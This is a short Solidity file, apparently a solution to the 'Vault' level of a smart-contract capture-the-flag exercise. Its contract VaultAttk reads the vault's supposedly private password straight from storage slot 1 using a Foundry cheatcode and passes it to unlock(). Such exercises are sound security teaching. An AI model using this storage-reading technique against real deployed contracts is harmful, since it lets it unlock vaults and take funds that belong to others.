//SDPX-License-Identifier: MIT

pragma solidity ^0.8.19;

import {Broadcasted} from "./Broadcasted.sol";

contract VaultAttk is Broadcasted {
    function attack(address payable vaultCtr_) public payable override {
        IVault(vaultCtr_).unlock(vm.load(vaultCtr_, bytes32(uint256(1))));
    }
}

interface IVault {
    function unlock(bytes32 _password) external;
}
